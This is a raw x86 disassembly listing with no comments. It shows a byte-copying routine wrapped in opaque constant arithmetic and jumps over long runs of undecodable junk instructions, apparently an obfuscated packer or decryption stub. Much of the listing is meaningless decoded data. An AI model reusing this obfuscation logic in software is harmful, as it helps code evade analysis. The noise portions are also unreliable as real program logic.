  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x87e1b8c]
  415305:	xchg   esp,eax
  415306:	mov    bh,0x7c
  415308:	mov    esp,0xb518160e
  41530d:	adc    bl,BYTE PTR [eax]
  41530f:	sbb    bh,bh
  415311:	in     eax,dx
  415312:	xchg   esi,eax
  415313:	loopne 0x4152e8
  415315:	push   cs
  415316:	push   edx
  415317:	mov    ch,0x71
  415319:	or     eax,0x128126c4
  41531e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41531f:	aas    
  415320:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415322:	pop    esp
  415323:	add    al,0xdf
  415325:	adc    eax,0xeb129f83
  41532a:	in     eax,dx
  41532b:	rcr    DWORD PTR [esi],0xac
  41532e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415330:	div    DWORD PTR [esi+0x10]
  415333:	jge    0x4153a0
  415335:	pop    esi
  415336:	(bad)  
  415338:	dec    esp
  415339:	dec    edi
  41533a:	add    esi,0x4fb357c8
  415340:	dec    edx
  415341:	ja     0x4152f7
  415343:	mov    esi,0x9c12e458
  415348:	imul   esp,DWORD PTR [ebp+0x38],0x80d99cc0
  41534f:	xchg   edx,eax
  415350:	sar    BYTE PTR [eax],0x2c
  415353:	mov    ebx,0xd1cf4db5
  415358:	cmp    eax,0x8a62f8ba
  41535d:	nop
  41535e:	scas   eax,DWORD PTR es:[edi]
  41535f:	jge    0x415343
  415361:	pop    ss
  415362:	lea    esi,[ebx-0x5db85090]
  415368:	rep outs dx,DWORD PTR ds:[esi]
  41536a:	psubq  mm5,QWORD PTR [ecx-0x43]
  41536e:	dec    esp
  41536f:	pop    ss
  415370:	inc    esp
  415371:	aaa    
  415372:	cdq    
  415373:	stos   BYTE PTR es:[edi],al
  415374:	lock mov edx,DWORD PTR [eax-0x52]
  415378:	outs   dx,DWORD PTR ds:[esi]
  415379:	rol    bl,cl
  41537b:	arpl   WORD PTR ds:0xca5c46a3,sp
  415381:	push   0x86737a4f
  415386:	jp     0x4153b4
  415388:	lds    ebx,FWORD PTR [ecx+ebx*2+0x5c]
  41538c:	ja     0x415317
  41538e:	and    ch,BYTE PTR [esi+ebp*8-0x1dc4c3eb]
  415395:	pop    esp
  415396:	sub    al,0x96
  415398:	jle    0x4153a5
  41539a:	jle    0x4153f2
  41539c:	repnz add ah,BYTE PTR [edx-0x15]
  4153a0:	pusha  
  4153a1:	and    edi,ebp
  4153a3:	je     0x415391
  4153a5:	fnsave [esi-0x43]
  4153a8:	shr    dl,cl
  4153aa:	jo     0x41535e
  4153ac:	xchg   DWORD PTR [ebx+0x75],esp
  4153af:	and    BYTE PTR [ebp+ebp*2+0x68daed15],ah
  4153b6:	mov    eax,0x1390651b
  4153bb:	xlat   BYTE PTR ds:[ebx]
  4153bc:	xlat   BYTE PTR ds:[ebx]
  4153bd:	push   eax
  4153be:	out    dx,eax
  4153bf:	sbb    dl,al
  4153c1:	pop    ecx
  4153c2:	and    al,0xe5
  4153c4:	fbld   TBYTE PTR [edx+0x171127d9]
  4153ca:	int3   
  4153cb:	test   esp,ebx
  4153cd:	arpl   WORD PTR [edi-0x7126953e],dx
  4153d3:	mov    dl,0xbe
  4153d5:	mov    ah,0xad
  4153d7:	nop
  4153d8:	push   es
  4153d9:	mov    ecx,0xf0bc7971
  4153de:	dec    edi
  4153df:	jmp    FWORD PTR [ecx+0x1caba611]
  4153e5:	cmp    eax,0xcf1898dc
  4153ea:	stos   BYTE PTR es:[edi],al
  4153eb:	xchg   ecx,eax
  4153ec:	mov    gs,WORD PTR gs:[ebx]
  4153ef:	mov    eax,ds:0x97451989
  4153f4:	aad    0x4
  4153f6:	pop    esp
  4153f7:	jnp    0x4153bd
  4153f9:	jp     0x4153e8
  4153fb:	inc    esp
  4153fc:	sbb    BYTE PTR [edi],ch
  4153fe:	cwde   
  4153ff:	shl    BYTE PTR [ebp-0x25],cl
  415402:	xchg   edi,eax
  415403:	aaa    
  415404:	dec    edx
  415405:	int3   
  415406:	mov    BYTE PTR [ecx],bh
  415408:	out    dx,al
  415409:	xor    eax,0x224e4a24
  41540e:	xlat   BYTE PTR ds:[ebx]
  41540f:	or     eax,0x213cf921
  415414:	inc    esi
  415415:	pop    eax
  415416:	call   0x2c619cc7
  41541b:	pusha  
  41541c:	xor    al,0x60
  41541e:	jns    0x4153ad
  415420:	clc    
  415421:	stos   BYTE PTR es:[edi],al
  415422:	sub    ecx,ebx
  415424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415425:	sbb    al,0x5e
  415427:	fwait
  415428:	mov    BYTE PTR [ebx],ah
  41542a:	cmp    BYTE PTR [eax],dl
  41542c:	cmp    DWORD PTR [ebx+0x48],esi
  41542f:	or     eax,0xc709fde5
  415434:	sub    eax,DWORD PTR [ecx-0x1c1935a8]
  41543a:	sub    eax,0xf6063230
  41543f:	push   0x26efceda
  415444:	mov    dh,0xce
  415446:	ret    
  415447:	add    al,0x81
  415449:	push   edx
  41544a:	jmp    0xb131cad5
  41544f:	fmul   st(1),st
  415451:	ror    DWORD PTR [eax+0x17],1
  415454:	mov    ebx,0x52d31e5b
  415459:	nop
  41545a:	mov    esp,0x3bc21512
  41545f:	mov    al,ds:0x2221eda8
  415464:	push   ebx
  415465:	(bad)  
  415466:	mov    cs,ecx
  415468:	mov    ds:0xc9a15313,al
  41546d:	mov    eax,0x7d31aa0b
  415472:	push   ecx
  415473:	xchg   edi,eax
  415474:	xchg   ecx,eax
  415475:	call   0x4d2b:0x2f508962
  41547c:	xchg   edi,eax
  41547d:	imul   esp,DWORD PTR [ebp-0x55b87581],0x18
  415484:	rcl    ebx,0x98
  415487:	sub    eax,0xb66b8075
  41548c:	xor    edx,DWORD PTR ds:0x4f5f9c15
  415492:	dec    esp
  415493:	push   ss
  415494:	add    eax,0xf5d5897e
  415499:	push   cs
  41549a:	scas   eax,DWORD PTR es:[edi]
  41549b:	inc    ebx
  41549c:	mov    cs,WORD PTR [edx]
  41549e:	cmp    BYTE PTR [edx+esi*4+0x7711c8ad],cl
  4154a5:	out    dx,al
  4154a6:	xor    BYTE PTR [eax],cl
  4154a8:	fwait
  4154a9:	xor    al,0x9c
  4154ab:	leave  
  4154ac:	adc    BYTE PTR [ebp+0x72],ch
  4154af:	push   ecx
  4154b0:	outs   dx,BYTE PTR ds:[esi]
  4154b1:	ins    BYTE PTR es:[edi],dx
  4154b2:	fcomi  st,st(7)
  4154b4:	pop    esi
  4154b5:	inc    edi
  4154b6:	mov    esi,0xa8a360b
  4154bb:	shr    BYTE PTR [esi+0x402da469],cl
  4154c1:	mov    dh,0x68
  4154c3:	or     al,0x2e
  4154c5:	and    esp,edx
  4154c7:	dec    edx
  4154c8:	aam    0xc5
  4154ca:	push   edx
  4154cb:	shl    BYTE PTR [edi+0x6be600eb],1
  4154d1:	loopne 0x41553d
  4154d3:	sbb    ch,BYTE PTR [edx+esi*4+0x2d]
  4154d7:	(bad)  
  4154d8:	dec    eax
  4154d9:	sbb    BYTE PTR [esi+0x688ca8c5],al
  4154df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154e0:	xlat   BYTE PTR ds:[ebx]
  4154e1:	sbb    eax,0x6e8508a3
  4154e6:	mov    ebx,DWORD PTR [edx+0x4]
  4154e9:	inc    edi
  4154ea:	sub    al,0xad
  4154ec:	(bad)  
  4154ed:	fcmove st,st(2)
  4154ef:	bound  ebx,QWORD PTR [edx-0x3c]
  4154f2:	arpl   WORD PTR [edx+eax*4+0x38],bp
  4154f6:	jmp    0x2862:0xcf222a04
  4154fd:	cmp    esi,DWORD PTR [edx+0x492098a4]
  415503:	leave  
  415504:	fdiv   DWORD PTR [ebp-0x33c08e32]
  41550a:	mov    BYTE PTR [edx-0x166ba5e0],dh
  415510:	sub    BYTE PTR [edi-0x25f2de91],ch
  415516:	popf   
  415517:	xchg   DWORD PTR [ecx+0x28],ecx
  41551a:	push   0xffffffec
  41551c:	jo     0x4154bd
  41551e:	fsub   DWORD PTR [eax-0x2c88e7e9]
  415524:	es mov ah,0xb3
  415527:	call   0x8b98e255
  41552c:	mov    cl,0xd2
  41552e:	ss cs sahf 
  415531:	out    0xe3,eax
  415533:	mov    eax,0x2acc939f
  415538:	leave  
  415539:	push   cs
  41553a:	arpl   bx,si
  41553c:	ss into 
  41553e:	add    al,0x6
  415540:	std    
  415541:	jmp    0x41553e
  415543:	mov    bl,0xa6
  415545:	cmp    dh,BYTE PTR [edi-0x61]
  415548:	cmp    eax,0xffd6fa3a
  41554d:	sbb    eax,0xaa4f6d03
  415552:	rcl    BYTE PTR [esi+0xc],cl
  415555:	jg     0x4155d1
  415557:	cmp    BYTE PTR [ebp+0x10],dh
  41555a:	pop    es
  41555b:	test   BYTE PTR [ecx],bl
  41555d:	add    ah,0xf
  415560:	mov    ?,WORD PTR [edx+0x28ca903e]
  415566:	xchg   ebp,eax
  415567:	fnsave [ebx+0x58258101]
  41556d:	int3   
  41556e:	and    ch,BYTE PTR [esi]
  415570:	je     0x415599
  415572:	mov    ch,BYTE PTR [esi+ebp*8+0x4f]
  415576:	test   al,0xd5
  415578:	and    BYTE PTR [edi],dl
  41557a:	inc    eax
  41557b:	test   BYTE PTR ds:0x8a1b9a02,dh
  415581:	lods   eax,DWORD PTR ds:[esi]
  415582:	call   0x4f0f8147
  415587:	cs leave 
  415589:	push   eax
  41558a:	push   esp
  41558b:	mov    ah,0xa9
  41558d:	icebp  
  41558e:	ins    BYTE PTR es:[edi],dx
  41558f:	mov    ds:0x387e29b3,eax
  415594:	ins    BYTE PTR es:[edi],dx
  415595:	inc    eax
  415596:	jle    0x415604
  415598:	sub    dh,BYTE PTR [edi+eax*1-0x3b7c7235]
  41559f:	push   ecx
  4155a0:	add    bh,ch
  4155a2:	mov    esp,0x1e94fd5d
  4155a7:	scas   al,BYTE PTR es:[edi]
  4155a8:	test   al,0xbc
  4155aa:	jl     0x4155b3
  4155ac:	sbb    eax,0xa4c9c2d7
  4155b1:	ss jge 0x415592
  4155b4:	mov    al,ds:0xf2f95ff6
  4155b9:	or     al,BYTE PTR [ebx-0x6f]
  4155bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155bd:	inc    esp
  4155be:	sub    eax,0x842f56f4
  4155c3:	lods   eax,DWORD PTR ds:[esi]
  4155c4:	xchg   esi,eax
  4155c5:	aad    0x67
  4155c7:	push   0x3a907c82
  4155cc:	out    0x86,al
  4155ce:	mov    dh,0xe8
  4155d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d1:	and    ebx,DWORD PTR [eax]
  4155d3:	loopne 0x4155c7
  4155d5:	mov    ecx,0x5f66343e
  4155da:	xchg   ecx,eax
  4155db:	ffreep st(1)
  4155dd:	lahf   
  4155de:	call   0xa450:0xffbed9ce
  4155e5:	mov    ds:0x4ad63669,al
  4155ea:	cmp    ch,BYTE PTR [esi]
  4155ec:	nop
  4155ed:	jb     0x415647
  4155ef:	hlt    
  4155f0:	fwait
  4155f1:	inc    ecx
  4155f2:	sub    BYTE PTR [ecx+0x4e],cl
  4155f5:	xchg   ebp,eax
  4155f6:	xor    eax,0xd273ab88
  4155fb:	pop    es
  4155fc:	push   0xf2b96a00
  415601:	adc    eax,0xc18a8812
  415606:	test   DWORD PTR [edi-0x21],edi
  415609:	xor    edi,DWORD PTR [ecx]
  41560b:	pop    ss
  41560c:	sar    BYTE PTR [ecx],1
  41560e:	push   eax
  41560f:	mov    ebp,DWORD PTR [edi-0x14e977aa]
  415615:	int    0x81
  415617:	cld    
  415618:	(bad)  
  415619:	(bad)  
  41561a:	sub    al,0xc6
  41561c:	mov    eax,ds:0x64f6d8f3
  415621:	or     DWORD PTR [ebx+0x1f],0x6ee509ac
  415628:	lods   al,BYTE PTR ds:[esi]
  415629:	cld    
  41562a:	ret    0x7726
  41562d:	sahf   
  41562e:	sub    BYTE PTR [edi+0x42],0x20
  415632:	mov    bl,BYTE PTR [ebp+eiz*2+0x63]
  415636:	pusha  
  415637:	retf   0x12fe
  41563a:	push   edi
  41563b:	inc    ecx
  41563c:	push   ebp
  41563d:	(bad)  
  41563f:	jae    0x415625
  415641:	dec    edi
  415642:	xchg   BYTE PTR [ebx-0x15],dh
  415645:	push   esp
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x4156aa
  41567f:	xchg   ebx,eax
  415680:	cmp    DWORD PTR [edx+0x58],ebp
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp+0x37181812],dh
  41568b:	repz mov ah,BYTE PTR [esi]
  41568e:	int3   
  41568f:	jno    0x4156bd
  415691:	clc    
  415692:	push   ebx
  415693:	stos   DWORD PTR es:[edi],eax
  415694:	inc    ebp
  415695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415696:	sbb    ecx,esp
  415698:	mov    dl,0x80
  41569a:	inc    eax
  41569b:	mov    dl,0xd1
  41569d:	sub    BYTE PTR [esi+0x5a679ec1],ah
  4156a3:	add    ebx,DWORD PTR [esi]
  4156a5:	jmp    0x72eddad7
  4156aa:	xchg   eax,eax
  4156ac:	xlat   BYTE PTR ds:[ebx]
  4156ad:	scas   eax,DWORD PTR es:[edi]
  4156ae:	jl     0x4156a2
  4156b0:	xor    DWORD PTR [ebx-0x73f59079],0xffffffb6
  4156b7:	mov    al,0x94
  4156b9:	(bad)  
  4156ba:	or     ebp,edx
  4156bc:	dec    edi
  4156bd:	stos   DWORD PTR es:[edi],eax
  4156be:	cmp    dl,ah
  4156c0:	cmp    bl,0x8d
  4156c3:	and    al,0xb6
  4156c5:	in     eax,0x53
  4156c7:	sub    BYTE PTR ds:0x974fe7c,cl
  4156cd:	mov    dh,0xd9
  4156cf:	shl    DWORD PTR [eax-0x17],0x11
  4156d3:	adc    al,0xa8
  4156d5:	add    esp,DWORD PTR [edx+0x6ab6c9db]
  4156db:	xchg   ebx,eax
  4156dc:	mov    edi,0x75765912
  4156e1:	call   0xc8e6a107
  4156e6:	aaa    
  4156e7:	jne    0x415684
  4156e9:	fld    QWORD PTR [ebx+0x3485feb2]
  4156ef:	inc    esp
  4156f0:	je     0x4156cf
  4156f2:	jne    0x41575a
  4156f4:	jmp    0xa49e:0xa0cfc094
  4156fb:	or     al,BYTE PTR [ebx-0x7bbeadc5]
  415701:	xor    eax,0x6729f742
  415706:	ror    ebx,cl
  415708:	sbb    DWORD PTR ds:0xdf96e49b,ecx
  41570e:	div    DWORD PTR [ebx]
  415710:	jge    0x415721
  415712:	xor    DWORD PTR [esi+0x4c],eax
  415715:	sbb    BYTE PTR ds:0x90a443b9,dl
  41571b:	mov    esi,0x294e3e0a
  415720:	hlt    
  415721:	sub    DWORD PTR [esi+ecx*4],ebx
  415724:	xor    ah,ch
  415726:	ret    
  415727:	pop    esp
  415728:	mov    dh,0x83
  41572a:	test   eax,0x1e9ee434
  41572f:	xchg   edx,eax
  415730:	outs   dx,BYTE PTR ds:[esi]
  415731:	jo     0x415739
  415733:	nop
  415734:	sahf   
  415735:	(bad)  
  415736:	scas   eax,DWORD PTR es:[edi]
  415737:	pop    ebx
  415738:	(bad)  
  415739:	out    dx,al
  41573a:	xchg   ch,bh
  41573c:	mov    dl,0x8d
  41573e:	repnz (bad) 
  415740:	into   
  415741:	loope  0x41578a
  415743:	push   ebx
  415744:	add    eax,0x7c325cc3
  415749:	mov    eax,ds:0x7a97c161
  41574e:	sti    
  41574f:	push   si
  415751:	mov    cl,0xe7
  415753:	jns    0x41576f
  415755:	sbb    ecx,edx
  415757:	icebp  
  415758:	mov    ebp,0x24d63994
  41575d:	ins    DWORD PTR es:[edi],dx
  41575e:	ja     0x4157a7
  415760:	(bad)  
  415761:	retf   
  415762:	cmp    DWORD PTR [ebx+0x4b],ecx
  415765:	mov    ebx,0xf6d63872
  41576a:	add    edx,DWORD PTR [ebx]
  41576c:	sbb    BYTE PTR [eax],ah
  41576e:	mov    al,0x6f
  415770:	or     eax,0x2f1ddd05
  415775:	ss jb  0x4157a8
  415778:	mov    esp,DWORD PTR [edx+0xf]
  41577b:	(bad)  
  41577c:	push   cs
  41577d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41577e:	sahf   
  41577f:	cli    
  415780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415781:	aam    0xd4
  415783:	pop    es
  415784:	mov    dl,0x1
  415786:	dec    eax
  415787:	xor    BYTE PTR [edi],bh
  415789:	test   DWORD PTR ds:0x3684cf47,esi
  41578f:	mov    edx,0x2c8df040
  415794:	adc    eax,DWORD PTR [ebp-0x28]
  415797:	jmp    0x58216eff
  41579c:	xchg   esp,eax
  41579d:	dec    edx
  41579e:	in     eax,dx
  41579f:	fwait
  4157a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157a1:	loopne 0x4157f7
  4157a3:	loopne 0x41581a
  4157a5:	push   esp
  4157a6:	scas   al,BYTE PTR es:[edi]
  4157a7:	js     0x41573f
  4157a9:	call   0x543b:0x669c5e9e
  4157b0:	inc    ebx
  4157b1:	push   edx
  4157b2:	clc    
  4157b3:	mov    bh,0x2d
  4157b5:	sub    al,0xcb
  4157b7:	mov    ds:0xe44ea341,al
  4157bc:	adc    eax,0xeaa56b5f
  4157c1:	dec    ebx
  4157c2:	mov    ebp,0x599523d9
  4157c7:	icebp  
  4157c8:	ffree  st(7)
  4157ca:	inc    eax
  4157cb:	xor    al,0x72
  4157cd:	inc    ebx
  4157ce:	rol    cl,1
  4157d0:	or     ch,BYTE PTR fs:0xfb9f6ded
  4157d7:	test   eax,0xb9c3757f
  4157dc:	imul   esp,DWORD PTR [ecx],0xe6228edb
  4157e2:	inc    esi
  4157e3:	shl    DWORD PTR [edi+ecx*1+0x2d],0x1d
  4157e8:	xor    BYTE PTR [ebx],dh
  4157ea:	cli    
  4157eb:	xlat   BYTE PTR ds:[bx]
  4157ed:	sub    esi,ecx
  4157ef:	mov    fs,esi
  4157f1:	in     al,dx
  4157f2:	stos   DWORD PTR es:[edi],eax
  4157f3:	pop    es
  4157f4:	xor    al,0x99
  4157f6:	mov    edi,0x8ed46153
  4157fb:	xor    BYTE PTR [edi+0x5d],0x38
  4157ff:	push   esi
  415800:	int    0xe5
  415802:	test   eax,0xa258bc21
  415807:	aas    
  415808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415809:	push   esp
  41580a:	adc    eax,0x5cfa4361
  41580f:	loope  0x41585e
  415811:	in     eax,dx
  415812:	cdq    
  415813:	adc    eax,0xddcddd69
  415818:	in     al,0xaf
  41581a:	or     BYTE PTR [edi+ebp*8],bh
  41581d:	mov    ds:0x81c9ad2a,eax
  415822:	dec    edx
  415823:	cli    
  415824:	jo     0x415870
  415826:	cmp    DWORD PTR [esi],ebx
  415828:	clc    
  415829:	push   ebx
  41582a:	push   es
  41582b:	call   0xf8a68457
  415830:	ret    0xe054
  415833:	loopne 0x4158a9
  415835:	ss out dx,al
  415837:	mov    edx,0xf6c7829b
  41583c:	cdq    
  41583d:	lock shr BYTE PTR [edx-0x7fc80201],0x28
  415845:	ins    BYTE PTR es:[edi],dx
  415846:	mov    esp,0xe4294d0f
  41584b:	adc    BYTE PTR [esi+0x7305c3dd],bl
  415851:	in     al,dx
  415852:	add    esp,ecx
  415854:	jmp    0x432c:0xe6b87a23
  41585b:	inc    ebx
  41585c:	js     0x4158bd
  41585e:	add    ch,BYTE PTR [edi+0x5e]
  415861:	pop    ds
  415862:	in     eax,0x67
  415864:	xchg   BYTE PTR [ecx+ebx*4],cl
  415867:	test   al,0xf6
  415869:	mov    cl,0x6f
  41586b:	pop    esp
  41586c:	iret   
  41586d:	scas   al,BYTE PTR es:[edi]
  41586e:	inc    ebp
  41586f:	cmp    BYTE PTR [edx+eiz*4+0x6b],al
  415873:	shr    eax,1
  415875:	cmp    edi,esp
  415877:	add    ch,BYTE PTR [eax+eax*4+0x51]
  41587b:	jno    0x4158a1
  41587d:	fdivr  st,st(5)
  41587f:	popf   
  415880:	ret    0x55ec
  415883:	dec    ecx
  415884:	mov    ecx,DWORD PTR [ebx+edi*2-0x2d]
  415888:	sbb    ah,0x77
  41588b:	xor    BYTE PTR [ebx-0x4b665c4],dh
  415891:	pop    eax
  415892:	js     0x41589f
  415894:	je     0x415838
  415896:	addr16 ja 0x4158c1
  415899:	dec    esp
  41589a:	xchg   DWORD PTR [edx+ebx*4+0x4e],ebx
  41589e:	lods   al,BYTE PTR ds:[esi]
  41589f:	xor    eax,0x80bd8084
  4158a4:	push   eax
  4158a5:	mov    esi,ds
  4158a7:	rol    BYTE PTR [ebp+0x31],1
  4158aa:	mov    esp,0x60e251cd
  4158af:	push   ebx
  4158b0:	outs   dx,BYTE PTR ds:[esi]
  4158b1:	dec    esp
  4158b2:	mov    eax,ds:0x15eb2d09
  4158b7:	mov    ah,0x2b
  4158b9:	sbb    ebx,edx
  4158bb:	sub    BYTE PTR [ebx+edx*1-0x4054922c],bh
  4158c2:	pop    ds
  4158c3:	outs   dx,DWORD PTR ds:[esi]
  4158c4:	mov    ebx,edx
  4158c6:	mov    edx,0x570e8ad5
  4158cb:	data16 and al,0x8e
  4158ce:	jbe    0x415915
  4158d0:	or     edx,ebx
  4158d2:	lds    ecx,FWORD PTR [esi-0x13]
  4158d5:	pop    esi
  4158d6:	test   BYTE PTR [esi],ch
  4158d8:	add    DWORD PTR [ebx-0x78],esp
  4158db:	in     eax,dx
  4158dc:	mov    gs,esp
  4158de:	jbe    0x4158f8
  4158e0:	loopne 0x415943
  4158e2:	dec    edi
  4158e3:	jnp    0x41590a
  4158e5:	sar    DWORD PTR [edx+0x67719062],1
  4158eb:	das    
  4158ec:	adc    cl,cl
  4158ee:	das    
  4158ef:	jge    0x41593f
  4158f1:	jmp    FWORD PTR [ebp+0x22]
  4158f4:	xor    bl,BYTE PTR [ecx]
  4158f6:	sbb    al,0xb
  4158f8:	retf   
  4158f9:	mov    bl,0x4
  4158fb:	stos   DWORD PTR es:[edi],eax
  4158fc:	sub    DWORD PTR [eax+0x705336b],esi
  415902:	jnp    0x415981
  415904:	add    ah,BYTE PTR [eax-0x10ff8ba6]
  41590a:	or     BYTE PTR [ecx+eax*1+0x27729e16],bl
  415911:	pcmpeqw mm5,mm7
  415914:	inc    eax
  415915:	inc    ebp
  415916:	mov    bh,0xf0
  415918:	sbb    bl,bl
  41591a:	test   BYTE PTR [ebx-0x4acd0036],cl
  415920:	out    dx,eax
  415921:	scas   al,BYTE PTR es:[edi]
  415922:	mov    esi,0xe3ae9ff6
  415927:	jb     0x415987
  415929:	mov    ch,0x4d
  41592b:	retf   
  41592c:	push   eax
  41592d:	adc    ecx,DWORD PTR [edi+0x77]
  415930:	out    dx,al
  415931:	mov    ecx,0x715db586
  415936:	addr16 je 0x415909
  415939:	leave  
  41593a:	jge    0x6e61b4a
  415940:	aam    0x7a
  415942:	ja     0x415916
  415944:	sub    BYTE PTR [eax-0x7],ah
  415947:	ja     0x415941
  415949:	add    BYTE PTR [ebp+0x38edeaa2],ch
  41594f:	sub    sp,WORD PTR gs:[eax]
  415953:	jns    0x415999
  415955:	sub    eax,0x9bdf37a
  41595a:	js     0x415957
  41595c:	call   0xee5b7dfe
  415961:	mov    dh,0x85
  415963:	stos   BYTE PTR es:[edi],al
  415964:	sub    ah,cl
  415966:	cmp    al,0xf4
  415968:	std    
  415969:	ss popa 
  41596b:	(bad)  
  41596c:	adc    al,0x2e
  41596e:	sub    eax,0xccc85685
  415973:	stc    
  415974:	ins    BYTE PTR es:[edi],dx
  415975:	data16 ffreep st(2)
  415978:	aaa    
  415979:	push   eax
  41597a:	xchg   dl,ah
  41597c:	in     al,dx
  41597d:	mov    ebp,0x462b98cf
  415982:	test   BYTE PTR [edx],bl
  415984:	mov    ds:0xc0d97d4e,eax
  415989:	sub    al,0x2d
  41598b:	or     edi,ecx
  41598d:	(bad)  
  41598f:	scas   eax,DWORD PTR es:[edi]
  415990:	jno    0x4159aa
  415992:	sub    BYTE PTR [edx+0x4d],0x97
  415996:	cli    
  415997:	or     cl,BYTE PTR [edi-0x54880cd6]
  41599d:	int3   
  41599e:	hlt    
  41599f:	mov    eax,ds:0x264c2e71
  4159a4:	and    bh,bh
  4159a6:	icebp  
  4159a7:	fucom  st(3)
  4159a9:	sbb    eax,0x1b7c53a3
  4159ae:	mov    ecx,0xe7263fba
  4159b3:	sub    eax,0x49506acc
  4159b8:	inc    ebp
  4159b9:	or     esi,DWORD PTR [ecx+0x6170f91f]
  4159bf:	xchg   ecx,eax
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42823b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428377,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42820b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42816b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282cf
  415a48:	cmp    DWORD PTR ds:0x42820b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
